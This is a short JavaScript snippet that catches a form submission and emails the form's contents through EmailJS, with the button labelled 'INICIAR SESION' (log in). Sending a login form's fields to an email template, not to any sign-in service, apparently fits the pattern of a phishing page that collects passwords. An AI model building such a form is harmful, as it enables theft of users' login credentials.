const btn = document.getElementById('button');

document.getElementById('form')
 .addEventListener('submit', function(event) {
   event.preventDefault();

   btn.value = 'Sending...';

   const serviceID = 'default_service';
   const templateID = 'template_kfj32qq';

   emailjs.sendForm(serviceID, templateID, this)
    .then(() => {
      btn.value = 'INICIAR SESION';
      alert('Sent!');
    }, (err) => {
      btn.value = 'INICIAR SESION';
      alert(JSON.stringify(err));
    });
});